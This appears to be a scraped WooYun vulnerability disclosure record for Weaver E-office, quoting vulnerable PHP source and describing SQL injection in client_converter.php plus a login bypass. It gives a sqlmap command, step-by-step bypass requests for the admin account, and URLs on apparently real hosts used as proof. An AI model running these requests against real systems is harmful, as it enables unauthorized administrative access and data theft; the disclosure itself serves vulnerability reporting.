{"id": 65613, "wybug_id": "wooyun-2015-0124503", "wybug_title": "泛微Eoffice某处文件存在多处SQL注入及可绕过登录直接操作后台", "wybug_corp": "泛微Eoffice", "wybug_author": "Bear baby", "wybug_date": "2015-07-06 16:59", "wybug_open_date": "2015-10-06 15:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-11：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向公众公开  简要描述： 表示还没收到过有$的洞，来一个试试 详细说明：  漏洞文件：/client_converter.php代码如下：\n<?php/*********************//*                   *//*  Version : 5.1.0  *//*  Author  : RM     *//*  Comment : 071223 *//*                   *//*********************/session_start( );include_once( \"inc/conn.php\" );$userAccount = $_REQUEST['userAccount'];$langID = $_REQUEST['lang'];$getLangFlagSQL = \"SELECT * FROM language WHERE LANG_ID = \".$langID;$getLangFlagResult = exequery( $connection, $getLangFlagSQL );$getLangFlagRow = mysql_fetch_array( $getLangFlagResult );$lang = $getLangFlagRow['LANG_AB'];$query = \"SELECT * from USER where USER_ACCOUNTS='\".$userAccount.\"'\";$cursor = exequery( $connection, $query );$ROW = mysql_fetch_array( $cursor );$query = \"SELECT * from USER_PRIV where USER_PRIV=\".$ROW['USER_PRIV'];$cursor = exequery( $connection, $query );if ( $ROW1 = mysql_fetch_array( $cursor ) ){\t\t\t\t$LOGIN_FUNC_STR = $ROW1['FUNC_ID_STR'];}$LOGIN_THEME = $ROW['THEME'];$template = $ROW['TEMPLATE'];if ( !$template ){\t\t\t\t$template_query = \"SELECT TEMPLATE_NAME FROM sys_template WHERE TEMPLATE_DEFAULT = 1 \";\t\t\t\t$template_rs = exequery( $connection, $template_query );\t\t\t\tif ( $row_tp = mysql_fetch_array( $template_rs ) )\t\t\t\t{\t\t\t\t\t\t\t\t$template = $row_tp['TEMPLATE_NAME'];\t\t\t\t}\t\t\t\telse\t\t\t\t{\t\t\t\t\t\t\t\t$template = \"8series\";\t\t\t\t}}if ( $template == \"8series\" ){\t\t\t\t$mainUrl = \"/general/index8.php\";}else if ( $template == \"7series\" ){\t\t\t\t$mainUrl = \"/general/index.php\";}else{\t\t\t\t$mainUrl = \"index8.php\";}if ( $LOGIN_THEME == \"\" ){\t\t\t\t$LOGIN_THEME = \"default\";}$LOGIN_THEME = $template.\"/\".$LOGIN_THEME;$_SESSION['LOGIN_USER_ID'] = $ROW['USER_ID'];$_SESSION['LOGIN_PASSWORD'] = $ROW['PASSWORD'];$_SESSION['LOGIN_POST_PRIV'] = $ROW['POST_PRIV'];$_SESSION['LOGIN_USER_ACCOUNTS'] = $ROW['USER_ACCOUNTS'];$_SESSION['LOGIN_USER_NAME'] = $ROW['USER_NAME'];$_SESSION['LOGIN_USER_PRIV'] = $ROW['USER_PRIV'];$_SESSION['LOGIN_DEPT_ID'] = $ROW['DEPT_ID'];$_SESSION['LOGIN_FUNC_STR'] = $LOGIN_FUNC_STR;$_SESSION['LOGIN_THEME'] = $LOGIN_THEME;$_SESSION['LOGIN_LANG_ID'] = $langID;$_SESSION['LOGIN_LANG'] = $lang;$targetType = $_REQUEST['target'];$url = $_REQUEST['goto'];$funcID = $_REQUEST['funcID'];if ( $funcID != \"\" ){\t\t\t\t$query = \"update user_menu set FREQUENCY =FREQUENCY+1 where user_id='\".$ROW['USER_ID'].\"' and func_id={$funcID}; \";\t\t\t\texequery( $connection, $query );}if ( $targetType == \"blank\" ){\t\t\t\theader( \"location:\".$url );}else{\t\t\t\theader( \"location:\".$mainUrl.\"?goto=\".urlencode( $url ) );}?>\n注入漏洞：注入存在以下语句\n$userAccount = $_REQUEST['userAccount'];$langID = $_REQUEST['lang'];$getLangFlagSQL = \"SELECT * FROM language WHERE LANG_ID = \".$langID; //lang直接进入sql\n查询\n$getLangFlagResult = exequery( $connection, $getLangFlagSQL );$getLangFlagRow = mysql_fetch_array( $getLangFlagResult );$lang = $getLangFlagRow['LANG_AB'];$query = \"SELECT * from USER where USER_ACCOUNTS='\".$userAccount.\"'\"; //userAccount直接进入sql查询$cursor = exequery( $connection, $query );$ROW = mysql_fetch_array( $cursor );……..省略代码……$funcID = $_REQUEST['funcID'];if ( $funcID != \"\" ){\t\t\t\t$query = \"update user_menu set FREQUENCY =FREQUENCY+1 where user_id='\".$ROW['USER_ID'].\"' and func_id={$funcID}; \"; //funcID直接进入sql查询\t\t\t\texequery( $connection, $query );}\n上面三处参数都是直接进入sql语句进行查询，导致注入\nsqlmap.py -u \"http://localhost/client_converter.php?userAccount=1&lang=1\" --dbms=mysql --dbs\n\n\n网上案例测试如下\n\n绕过登录直接操作后台问题存在如下代码：\n$query = \"SELECT * from USER where USER_ACCOUNTS='\".$userAccount.\"'\";$cursor = exequery( $connection, $query );$ROW = mysql_fetch_array( $cursor );$query = \"SELECT * from USER_PRIV where USER_PRIV=\".$ROW['USER_PRIV'];$cursor = exequery( $connection, $query );if ( $ROW1 = mysql_fetch_array( $cursor ) ){\t\t\t\t$LOGIN_FUNC_STR = $ROW1['FUNC_ID_STR'];}……省略代码……//userAccount参数进入SQL语句，查询UserAccount表，如记录存在 把USER_ID PASSWORD等值赋值到SESSION里面。$LOGIN_THEME = $template.\"/\".$LOGIN_THEME;$_SESSION['LOGIN_USER_ID'] = $ROW['USER_ID'];$_SESSION['LOGIN_PASSWORD'] = $ROW['PASSWORD'];$_SESSION['LOGIN_POST_PRIV'] = $ROW['POST_PRIV'];$_SESSION['LOGIN_USER_ACCOUNTS'] = $ROW['USER_ACCOUNTS'];$_SESSION['LOGIN_USER_NAME'] = $ROW['USER_NAME'];$_SESSION['LOGIN_USER_PRIV'] = $ROW['USER_PRIV'];$_SESSION['LOGIN_DEPT_ID'] = $ROW['DEPT_ID'];$_SESSION['LOGIN_FUNC_STR'] = $LOGIN_FUNC_STR;$_SESSION['LOGIN_THEME'] = $LOGIN_THEME;$_SESSION['LOGIN_LANG_ID'] = $langID;$_SESSION['LOGIN_LANG'] = $lang;再看后台验证功能的文件，/inc/auth.php。部分代码如下session_start( );include_once( \"inc/utility.php\" );include_once( \"inc/conn.php\" );global $_sess;if ( !session_is_registered( \"LOGIN_USER_ID\" ) ) //LOGIN_USER_ID{\t\t\t\t$url = $_SERVER['PHP_SELF'];\t\t\t\techo \"<script>\\r\\n\\ttop.location.href='/login.php';\\r\\n\\t</script>\";\t\t\t\texit( );}$_sess['lang'] = $_SESSION['LOGIN_LANG'];$_sess['lg_theme'] = $_SESSION['LOGIN_THEME'];$lang_file = \"lang/\".$_sess['lang'].\"/common.lang.php\";include_once( $lang_file );includelangpak( \"other\" );if ( $_SESSION['LOGIN_OA_ISPIRIT'] != \"ispirit\" ){\t\t\t\t$sql = \"SELECT * FROM SYS_PARA WHERE PARA_NAME = 'LIMIT_LOGIN_TIMES' \";\t\t\t\t$re = exequery( $connection, $sql );\t\t\t\t$row = mysql_fetch_array( $re );\t\t\t\t$lock = $row['PARA_VALUE'];\t\t\t\tif ( $lock == \"1\" )\t\t\t\t{\t\t\t\t\t\t\t\t$sid = session_id( );\t\t\t\t\t\t\t\t$uid = $_SESSION['LOGIN_USER_ID'];\t\t\t\t\t\t\t\t$sql = \"SELECT SESSION_ID FROM user_online WHERE USER_ID='\".$uid.\"'\";\t\t\t\t\t\t\t\t$re = exequery( $connection, $sql );\t\t\t\t\t\t\t\t$row = mysql_fetch_array( $re );\t\t\t\t\t\t\t\t$row['SESSION_ID'];\n该文件通过判断session里面的值进行用户验证。利用方法：先构造一个用户 如admin。访问client_converter.php?userAccount=用户名&lang=cn\n\n出现报错，没关系，接下来直接访问后台主页 general/index8.php。可以访问了。\n\n再访问个 用户管理页面general/system/user/userlist.php。\n\n   漏洞证明：  网上测试案例：http://219.232.254.131:8082/client_converter.php?userAccount=admin&lang=cnhttp://219.232.254.131:8082/general/system/user/userlist.php\n\n\n\n官网http://eoffice8.weaver.cn:8028/client_converter.php?userAccount=admin&lang=cnhttp://eoffice8.weaver.cn:8028/general/system/user/userlist.php\n\n\n\n   修复方案：  严格过滤参数，加强安全意识。   版权声明：转载请注明来源 Bear baby@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：11  确认时间：2015-07-08 15:24 厂商回复： CNVD确认所述情况，已经由CNVD通过以往建立的处置渠道向软件生产厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-04 17:12 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  你的很多都有$啊    \n     2015-07-04 17:26 |    \t\t茜茜公主 \t\t\t( 普通白帽子  |\t\t\t        Rank:2373 漏洞数:407        | 家里二宝出生，这几个月忙着把屎把尿...忒...)\t\t \n  好浮夸 表示还没收到过有$的洞，来一个试试    \n     2015-07-04 18:27 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @xsser 额，是要再等等才会显示$符号是么。。    \n     2015-07-04 18:28 |    \t\tBear baby \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:20        | 善攻者，不知其所守。善守者，不知其所攻。)\t\t \n  @茜茜公主 我的错。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 11, "Ranks": null}